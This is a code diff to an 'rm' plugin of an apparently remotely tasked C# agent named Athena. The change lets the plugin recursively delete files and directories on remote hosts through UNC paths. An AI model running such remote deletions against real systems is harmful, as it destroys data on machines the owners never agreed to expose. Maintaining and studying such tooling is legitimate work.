@@ -5,6 +5,7 @@ using System.Collections.Generic;
 using System.IO;
 using Athena.Commands;
 using Athena.Models.Responses;
+using System.Text;
 
 namespace Plugins
 {
@@ -13,39 +14,26 @@ namespace Plugins
         public override string Name => "rm";
         public override void Execute(Dictionary<string, string> args)
         {
+            string file = args.ContainsKey("file") ? args["file"] : string.Empty;
+            string path = args.ContainsKey("path") ? args["path"] : string.Empty;
+            string host = args.ContainsKey("host") ? args["host"] : string.Empty;
+
+            if (!String.IsNullOrEmpty(host) &! host.StartsWith("\\\\"))
+            {
+                host = "\\\\" + host;
+            }
+
+            string fullPath = Path.Combine(host, path, file);
             try
             {
-                if (args.ContainsKey("path"))
+                FileAttributes attr = File.GetAttributes(fullPath);
+                if (attr.HasFlag(FileAttributes.Directory))
                 {
-                    FileAttributes attr = File.GetAttributes((args["path"]).Replace("\"", ""));
-
-                    // Check if Directory
-                    if (attr.HasFlag(FileAttributes.Directory))
-                    {
-                        Directory.Delete((args["path"]).Replace("\"", ""), true);
-                    }
-                    else
-                    {
-                        File.Delete(args["path"]);
-                    }
-
-                    TaskResponseHandler.AddResponse(new ResponseResult
-                    {
-                        completed = true,
-                        user_output = "Deleted: " + (args["path"]).Replace("\"", ""),
-                        task_id = args["task-id"],
-                    });
+                    Directory.Delete(fullPath.Replace("\"", ""), true);
                 }
                 else
                 {
-
-                    TaskResponseHandler.AddResponse(new ResponseResult
-                    {
-                        completed = true,
-                        process_response = new Dictionary<string, string> { { "message", "0x27" } },
-                        task_id = args["task-id"],
-                        status = "error"
-                    });
+                    File.Delete(fullPath.Replace("\"",""));
                 }
             }
             catch (Exception e)
